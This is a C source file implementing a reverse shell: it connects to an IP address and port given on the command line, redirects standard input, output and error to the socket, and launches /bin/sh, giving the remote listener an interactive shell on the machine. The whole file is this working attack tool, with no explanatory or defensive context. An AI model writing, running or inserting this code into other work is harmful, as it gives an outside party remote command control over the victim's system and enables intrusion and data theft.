#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char const *argv[])
{
    if (argc != 3)
    {
        printf("Usage %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(argv[2]));
    inet_aton(argv[1], &serv_addr.sin_addr); //ok

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) >= 0)
    {
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }

    return 0;
}